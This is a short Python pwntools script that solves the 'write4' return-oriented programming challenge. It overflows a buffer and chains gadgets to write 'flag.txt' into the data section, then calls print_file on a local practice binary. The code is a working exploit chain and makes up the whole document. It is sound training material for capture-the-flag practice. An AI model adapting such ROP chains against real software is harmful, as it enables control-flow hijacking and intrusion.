from pwn import *

junk = b'A' * 40
str = b"flag.txt".ljust(8, b'\x00')
str_pack = p64(u64(str))

g1 = p64(0x0000000000400693) # pop rdi ; ret
g2 = p64(0x0000000000400690) # pop r14 ; pop r15 ; ret
g3 = p64(0x0000000000400628) # mov qword ptr [r14], r15 ; ret

data_section = p64(0x00601028)
print_file = p64(0x00400510)

payload = junk + g2 + data_section + str_pack + g3 + g1 + data_section + print_file

p = process('./write4')

p.recvuntil('>')
p.sendline(payload)
p.interactive()